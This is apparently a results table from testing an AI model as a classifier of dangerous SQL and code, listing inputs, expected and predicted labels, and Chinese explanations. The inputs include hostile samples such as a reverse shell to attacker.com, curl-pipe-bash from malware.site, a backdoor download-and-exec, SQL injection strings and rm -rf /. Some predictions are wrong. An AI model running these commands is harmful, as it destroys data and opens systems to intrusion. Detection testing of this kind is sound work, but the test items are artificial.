序号,类型,子类型,内容,预期标签,模型预测,is_dangerous,risk_level,risk_types,reason,matched_keywords,sanitized_suggestion,模型输出JSON,耗时(s),是否正确,JSON结构
14,sql,dangerous_ddl,DROP TABLE users,dangerous,dangerous,True,high,高危DDL,DROP TABLE语句会永久删除整个表结构和数据，属于高危操作，可能导致数据不可恢复的丢失,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL""],
  ""reason"": ""DROP TABLE语句会永久删除整个表结构和数据，属于高危操作，可能导致数据不可恢复的丢失""
}",6.26,是,✓
15,sql,dangerous_ddl,DROP DATABASE production,dangerous,dangerous,True,high,高危DDL|批量删除,DROP DATABASE语句会永久删除整个数据库及其所有数据，属于高危操作，且可能造成不可逆的数据丢失,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL"", ""批量删除""],
  ""reason"": ""DROP DATABASE语句会永久删除整个数据库及其所有数据，属于高危操作，且可能造成不可逆的数据丢失""
}",7.68,是,✓
16,sql,dangerous_ddl,TRUNCATE TABLE orders,dangerous,dangerous,True,high,批量删除,TRUNCATE TABLE语句会永久删除表中的所有数据，属于高危操作，存在数据丢失风险,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""批量删除""],
  ""reason"": ""TRUNCATE TABLE语句会永久删除表中的所有数据，属于高危操作，存在数据丢失风险""
}",6.55,是,✓
17,sql,batch_delete,DELETE FROM users,dangerous,dangerous,True,high,批量删除|高危DDL/DML,DELETE语句缺少WHERE条件，会导致删除users表中的所有数据，属于高危的批量删除操作,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""批量删除"", ""高危DDL/DML""],
  ""reason"": ""DELETE语句缺少WHERE条件，会导致删除users表中的所有数据，属于高危的批量删除操作""
}",10.68,是,✓
18,sql,batch_delete,DELETE FROM orders WHERE 1=1,dangerous,dangerous,True,high,批量删除|高危DDL/DML,使用了'WHERE 1=1'条件，这将导致删除表中的所有记录，属于高危的批量删除操作,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""批量删除"", ""高危DDL/DML""],
  ""reason"": ""使用了'WHERE 1=1'条件，这将导致删除表中的所有记录，属于高危的批量删除操作""
}",11.31,是,✓
19,sql,batch_update,UPDATE users SET password = 'hacked' WHERE 1=1,dangerous,dangerous,True,high,SQL注入|高危DDL/DML,SQL语句中存在明显的SQL注入特征（WHERE 1=1），且执行了高危的UPDATE操作，可能造成大量用户密码被篡改,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""SQL注入"", ""高危DDL/DML""],
  ""reason"": ""SQL语句中存在明显的SQL注入特征（WHERE 1=1），且执行了高危的UPDATE操作，可能造成大量用户密码被篡改""
}",8.79,是,✓
20,sql,system_table,SELECT * FROM information_schema.tables,dangerous,dangerous,True,high,系统表访问,该SQL语句访问了information_schema.tables系统表，可能用于获取数据库结构信息，存在信息泄露风险,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""系统表访问""],
  ""reason"": ""该SQL语句访问了information_schema.tables系统表，可能用于获取数据库结构信息，存在信息泄露风险""
}",7.25,是,✓
21,sql,system_table,SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE(),dangerous,normal,False,low,,此SQL语句仅为查询当前数据库中的表结构信息，属于信息收集操作，不涉及数据修改或删除，不存在SQL注入、越权访问、批量删除等高风险行为,,,"{
  ""is_dangerous"": false,
  ""risk_level"": ""low"",
  ""risk_types"": []
  						   	   		   , ""reason"": ""此SQL语句仅为查询当前数据库中的表结构信息，属于信息收集操作，不涉及数据修改或删除，不存在SQL注入、越权访问、批量删除等高风险行为""
}",8.82,否,✓
22,sql,system_table,SELECT * FROM mysql.user,dangerous,dangerous,True,high,系统表访问,访问了MySQL系统表mysql.user，该表包含数据库用户的认证信息和权限配置，属于高敏感级别的系统表，未经授权的访问可能泄露系统安全信息,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""系统表访问""],
  ""reason"": ""访问了MySQL系统表mysql.user，该表包含数据库用户的认证信息和权限配置，属于高敏感级别的系统表，未经授权的访问可能泄露系统安全信息""
}",7.66,是,✓
23,sql,command_exec,EXEC xp_cmdshell('dir c:'),dangerous,dangerous,True,high,高危DDL/DML|系统表访问,使用xp_cmdshell执行系统命令，具有极高安全风险，可导致系统权限泄露和远程执行攻击,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL/DML"", ""系统表访问""],
  ""reason"": ""使用xp_cmdshell执行系统命令，具有极高安全风险，可导致系统权限泄露和远程执行攻击""
}",7.81,是,✓
24,sql,file_access,SELECT load_file('/etc/passwd'),dangerous,dangerous,True,high,SQL注入|系统表访问|高危DDL/DML,使用load_file()函数读取系统文件存在严重安全风险，可能导致敏感信息泄露。该函数允许攻击者访问服务器上的任意文件，包括系统配置文件、数据库配置文件等，属于高危操作。,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""SQL注入"", ""系统表访问"", ""高危DDL/DML""]
  							   					,
  ""reason"": ""使用load_file()函数读取系统文件存在严重安全风险，可能导致敏感信息泄露。该函数允许攻击者访问服务器上的任意文件，包括系统配置文件、数据库配置文件等，属于高危操作。""
}",11.15,是,✓
25,sql,file_access,SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users,dangerous,dangerous,True,high,高危DDL/DML|系统表访问,使用SELECT * INTO OUTFILE将数据导出到系统文件路径，存在敏感数据泄露风险，且可能被用于数据窃取。,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL/DML"", ""系统表访问""],
  ""reason"": ""使用SELECT * INTO OUTFILE将数据导出到系统文件路径，存在敏感数据泄露风险，且可能被用于数据窃取。""
}",10.82,是,✓
26,sql,sql_injection,SELECT * FROM users WHERE name = '' OR ''='',dangerous,dangerous,True,high,SQL注入,该SQL存在明显的SQL注入漏洞。攻击者可以通过构造恶意输入（如'' OR ''=''）绕过身份验证，获取所有用户数据。这是典型的基于布尔逻辑的SQL注入攻击。,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""SQL注入""]
  		    		   		   		,

  ""reason"": ""该SQL存在明显的SQL注入漏洞。攻击者可以通过构造恶意输入（如'' OR ''=''）绕过身份验证，获取所有用户数据。这是典型的基于布尔逻辑的SQL注入攻击。""
}",12.3,是,✓
27,sql,privilege_escalation,"INSERT INTO users (name, role) SELECT 'hacker', 'admin' FROM dual",dangerous,dangerous,True,high,高危DDL/DML|越权访问,"该SQL语句通过INSERT操作向users表中插入了具有admin权限的用户数据，存在明显的越权访问风险。使用SELECT 'hacker', 'admin' from dual的方式可能是在尝试绕过正常的用户注册流程，直接创建具有高权限的账户，这属于高危的数据库操作。",,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL/DML"", ""越权访问""],
  ""reason"": ""该SQL语句通过INSERT操作向users表中插入了具有admin权限的用户数据，存在明显的越权访问风险。使用SELECT 'hacker', 'admin' from dual的方式可能是在尝试绕过正常的用户注册流程，直接创建具有高权限的账户，这属于高危的数据库操作。""
}",12.11,是,✓
28,sql,dangerous_ddl,ALTER TABLE users ADD COLUMN backdoor VARCHAR(255),dangerous,dangerous,True,high,高危DDL|系统表访问,该SQL语句使用ALTER TABLE向用户表添加了名为backdoor的列，这可能被恶意利用来存储后门数据或执行恶意操作，属于高危的DDL操作,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL"", ""系统表访问""]
  						   						   ,
  ""reason"": ""该SQL语句使用ALTER TABLE向用户表添加了名为backdoor的列，这可能被恶意利用来存储后门数据或执行恶意操作，属于高危的DDL操作""
}",10.34,是,✓
29,sql,privilege_escalation,GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%',dangerous,dangerous,True,high,高危DDL|越权访问,该SQL语句授予了'hacker'用户对所有数据库和表的完全权限（ALL PRIVILEGES），并且允许该用户从任意主机（%）连接，这是一个极其危险的操作，可能导致系统权限被恶意利用,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL"", ""越权访问""],
  ""reason"": ""该SQL语句授予了'hacker'用户对所有数据库和表的完全权限（ALL PRIVILEGES），并且允许该用户从任意主机（%）连接，这是一个极其危险的操作，可能导致系统权限被恶意利用""
}",10.51,是,✓
30,sql,info_gathering,"SELECT @@version, @@datadir, @@basedir",dangerous,normal,False,low,,该SQL语句仅为查询数据库版本信息和安装目录，属于信息收集操作，不涉及数据修改、删除或敏感操作，风险等级为低,,,"{
  ""is_dangerous"": false,
  ""risk_level"": ""low"",
  ""risk_types"": []
  			   					,
  ""reason"": ""该SQL语句仅为查询数据库版本信息和安装目录，属于信息收集操作，不涉及数据修改、删除或敏感操作，风险等级为低""
}",7.86,否,✓
31,sql,sql_injection,SELECT * FROM users WHERE id = 1; DROP TABLE users; --,dangerous,dangerous,True,high,sql_injection|high_risk_ddl,SQL语句中包含恶意的DROP TABLE语句，存在严重的数据删除风险，同时可能存在SQL注入攻击,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""sql_injection"", ""high_risk_ddl""],
  ""reason"": ""SQL语句中包含恶意的DROP TABLE语句，存在严重的数据删除风险，同时可能存在SQL注入攻击""
}",7.08,是,✓
32,sql,batch_update,UPDATE accounts SET balance = balance + 999999 WHERE user_id != 0,dangerous,dangerous,True,high,高危DDL/DML|越权访问,该SQL存在高风险：1) 使用了!=条件可能导致意外更新大量数据；2) 未进行权限验证直接更新账户余额；3) 可能导致资金异常变动,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL/DML"", ""越权访问""],
  ""reason"": ""该SQL存在高风险：1) 使用了!=条件可能导致意外更新大量数据；2) 未进行权限验证直接更新账户余额；3) 可能导致资金异常变动""
}",11.97,是,✓
33,sql,sql_injection,"SELECT * FROM users WHERE email LIKE '%@%' AND 1=1 UNION SELECT null,null,null--",dangerous,dangerous,True,high,sql_injection,该SQL语句存在明显的SQL注入特征，通过UNION SELECT进行恶意查询，可能绕过身份验证或获取敏感数据,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""sql_injection""],
  ""reason"": ""该SQL语句存在明显的SQL注入特征，通过UNION SELECT进行恶意查询，可能绕过身份验证或获取敏感数据""
}",10.39,是,✓
34,sql,command_exec,CALL sys.execute_prepared_stmt('DROP TABLE users'),dangerous,dangerous,True,high,高危DDL|系统表访问,使用CALL sys.execute_prepared_stmt执行DROP TABLE语句，存在高危DDL风险。该函数允许执行任意SQL语句，此处直接删除users表，属于危险操作。同时通过系统函数执行DDL语句，绕过了常规的权限检查机制，存在系统表访问风险。,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""高危DDL"", ""系统表访问""],
  ""reason"": ""使用CALL sys.execute_prepared_stmt执行DROP TABLE语句，存在高危DDL风险。该函数允许执行任意SQL语句，此处直接删除users表，属于危险操作。同时通过系统函数执行DDL语句，绕过了常规的权限检查机制，存在系统表访问风险。""
}",13.16,是,✓
35,sql,sql_injection,SELECT * FROM users WHERE id = CHAR(49) OR CHAR(49)=CHAR(49),dangerous,dangerous,True,high,SQL注入,存在明显的SQL注入风险，攻击者可以通过构造恶意输入绕过身份验证，其中CHAR(49)等价于'1'，OR条件可能导致身份验证绕过,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""SQL注入""],
  ""reason"": ""存在明显的SQL注入风险，攻击者可以通过构造恶意输入绕过身份验证，其中CHAR(49)等价于'1'，OR条件可能导致身份验证绕过""
}",10.09,是,✓
36,code,normal,"def add(a, b): return a + b",normal,normal,False,low,,该代码仅为一个简单的加法函数，不包含任何恶意行为或安全隐患。函数实现是标准的数学运算，没有涉及系统调用、文件操作、网络通信等可能带来安全风险的操作。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
 , ""reason"": ""该代码仅为一个简单的加法函数，不包含任何恶意行为或安全隐患。函数实现是标准的数学运算，没有涉及系统调用、文件操作、网络通信等可能带来安全风险的操作。""
}",9.26,是,✓
37,code,normal,import osnprint(os.getcwd()),normal,normal,False,low,,代码中存在语法错误（nprint应为print），但即使修正后，该代码仅执行获取当前工作目录的操作，不包含任何恶意行为。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
    						   					,
    ""reason"": ""代码中存在语法错误（nprint应为print），但即使修正后，该代码仅执行获取当前工作目录的操作，不包含任何恶意行为。""
}",8.91,是,✓
38,code,normal,import requestsnresp = requests.get('https://api.example.com/data')nprint(resp.json()),normal,normal,False,low,,代码功能为正常的HTTP GET请求，用于获取远程API数据并打印JSON响应。未发现明显的恶意行为特征，如shell执行、文件操作、权限提升等危险操作。属于标准的网络请求代码，风险等级为低。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
  						   						   , ""reason"": ""代码功能为正常的HTTP GET请求，用于获取远程API数据并打印JSON响应。未发现明显的恶意行为特征，如shell执行、文件操作、权限提升等危险操作。属于标准的网络请求代码，风险等级为低。""
}",10.67,是,✓
39,code,normal,"with open('config.json', 'r') as f:n    data = json.load(f)",normal,normal,False,low,,代码仅用于读取配置文件，没有发现任何恶意行为特征。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
    					   				    ,""reason"":""代码仅用于读取配置文件，没有发现任何恶意行为特征。""
}",6.39,是,✓
40,code,normal,"SELECT_QUERY = 'SELECT * FROM users WHERE id = ?'ncursor.execute(SELECT_QUERY, (user_id,))",normal,normal,False,low,,代码使用了参数化查询来防止SQL注入攻击，这是安全的数据库查询方式。使用了占位符(?)和参数元组来传递用户输入，有效避免了恶意SQL代码的执行。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
    			 				,
    ""reason"": ""代码使用了参数化查询来防止SQL注入攻击，这是安全的数据库查询方式。使用了占位符(?)和参数元组来传递用户输入，有效避免了恶意SQL代码的执行。""
}",11.13,是,✓
41,code,normal,import hashlibnhash = hashlib.sha256(password.encode()).hexdigest(),normal,normal,False,low,,这段代码只是实现了标准的SHA-256哈希计算功能，用于密码哈希处理，没有发现任何恶意行为或安全隐患。代码本身是安全的，符合常见的密码哈希实践。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
    , ""reason"": ""这段代码只是实现了标准的SHA-256哈希计算功能，用于密码哈希处理，没有发现任何恶意行为或安全隐患。代码本身是安全的，符合常见的密码哈希实践。""
}",11.16,是,✓
42,code,normal,"import subprocessnresult = subprocess.run(['ls', '-la'], capture_output=True)",normal,normal,False,low,,该代码仅执行了标准的系统命令'ls -la'来列出目录内容，没有涉及任何恶意行为或危险操作。这是一个常见的合法文件系统查询命令，不会对系统造成危害。,,,"{
    ""is_dangerous"": false,
    ""risk_level"": ""low"",
    ""risk_types"": []
 	,""reason"":""该代码仅执行了标准的系统命令'ls -la'来列出目录内容，没有涉及任何恶意行为或危险操作。这是一个常见的合法文件系统查询命令，不会对系统造成危害。""
}",11.19,是,✓
43,code,normal,"import socketns = socket.socket()ns.connect(('192.168.1.1', 80))",normal,dangerous,True,high,反弹Shell|远程代码执行,代码创建了socket连接并连接到外部IP地址(192.168.1.1:80)，这可能是恶意软件用来建立反向shell连接或进行远程控制的行为，属于高风险的恶意行为,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""反弹Shell"", ""远程代码执行""],
  ""reason"": ""代码创建了socket连接并连接到外部IP地址(192.168.1.1:80)，这可能是恶意软件用来建立反向shell连接或进行远程控制的行为，属于高风险的恶意行为""
}",11.87,否,✓
44,code,file_destroy,import osnos.system('rm -rf /'),dangerous,dangerous,True,high,文件破坏,代码中包含危险的系统命令 'rm -rf /'，该命令会递归强制删除根目录下的所有文件和目录，造成严重的系统文件破坏,,,"{
    ""is_dangerous"": true,
    ""risk_level"": ""high"",
    ""risk_types"": [""文件破坏""],
    ""reason"": ""代码中包含危险的系统命令 'rm -rf /'，该命令会递归强制删除根目录下的所有文件和目录，造成严重的系统文件破坏""
}",8.29,是,✓
45,code,reverse_shell,"import subprocessnsubprocess.Popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1', shell=True)",dangerous,dangerous,True,high,反弹Shell|远程代码执行,代码中使用subprocess.Popen执行了bash命令，该命令会建立一个到攻击者服务器的反向shell连接，属于典型的恶意行为，具有高风险,,,"{
  ""is_dangerous"": true,
  ""risk_level"": ""high"",
  ""risk_types"": [""反弹Shell"", ""远程代码执行""],
  ""reason"": ""代码中使用subprocess.Popen执行了bash命令，该命令会建立一个到攻击者服务器的反向shell连接，属于典型的恶意行为，具有高风险""
}",8.77,是,✓
46,code,malicious_download,import osnos.system('curl http://malware.site/shell.sh | bash'),dangerous,dangerous,True,high,反弹Shell|远程代码执行|后门植入,代码中使用了os.system执行远程curl命令，该命令会从恶意网站下载并执行shell脚本，存在典型的反弹Shell和远程代码执行风险，同时可能植入后门,,,"{
    ""is_dangerous"": true,
    ""risk_level"": ""high"",
    ""risk_types"": [""反弹Shell"", ""远程代码执行"", ""后门植入""],
    ""reason"": ""代码中使用了os.system执行远程curl命令，该命令会从恶意网站下载并执行shell脚本，存在典型的反弹Shell和远程代码执行风险，同时可能植入后门""
}",10.42,是,✓
47,code,malicious_download,"import urllib.requestnurllib.request.urlretrieve('http://evil.site/backdoor.py', '/tmp/.hidden')nexec(open('/tmp/.hidden').read())",dangerous,dangerous,True,high,恶意木马|后门植入|远程代码执行,代码通过urllib.request.urlretrieve从恶意站点下载后门文件到本地/tmp/.hidden路径，然后使用exec执行该文件，这是一种典型的后门植入和远程代码执行行为，具有高度危险性,,,"{
    ""is_dangerous"": true,
    ""risk_level"": ""high"",
    ""risk_types"": [
        ""恶意木马"",
        ""后门植入"",
        ""远程代码执行""
    ],
    ""reason"": ""代码通过urllib.request.urlretrieve从恶意站点下载后门文件到本地/tmp/.hidden路径，然后使用exec执行该文件，这是一种典型的后门植入和远程代码执行行为，具有高度危险性""
}",11.86,是,✓
48,code,file_permission,__import__('os').system('chmod 777 /etc/shadow'),dangerous,dangerous,True,high,权限提升|系统破坏,该代码通过__import__('os').system()执行系统命令，将/etc/shadow文件权限修改为777，这会严重破坏系统安全，允许任意用户修改系统密码文件，属于高危的权限提升和系统破坏行为,,,"{
    ""is_dangerous"": true,
    ""risk_level"": ""high"",
    ""risk_types"": [""权限提升"", ""系统破坏""],
    ""reason"": ""该代码通过__import__('os').system()执行系统命令，将/etc/shadow文件权限修改为777，这会严重破坏系统安全，允许任意用户修改系统密码文件，属于高危的权限提升和系统破坏行为""
}",12.06,是,✓
49,code,base64_obfuscation,"eval(compile(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='), '<string>', 'exec'))",dangerous,dangerous,True,high,远程代码执行|文件破坏,代码使用eval()执行动态编译的代码，结合base64解码后执行系统命令。解码后的命令为'rm -rf /'，具有删除系统根目录的恶意行为，属于高风险的远程代码执行和文件破坏漏洞。,,,"{
    ""is_dangerous"": true,
    ""risk_level"": ""high"",
    ""risk_types"": [
        ""远程代码执行"",
        ""文件破坏""
    ],
    ""reason"": ""代码使用eval()执行动态编译的代码，结合base64解码后执行系统命令。解码后的命令为'rm -rf /'，具有删除系统根目录的恶意行为，属于高风险的远程代码执行和文件破坏漏洞。""
}",13.14,是,✓
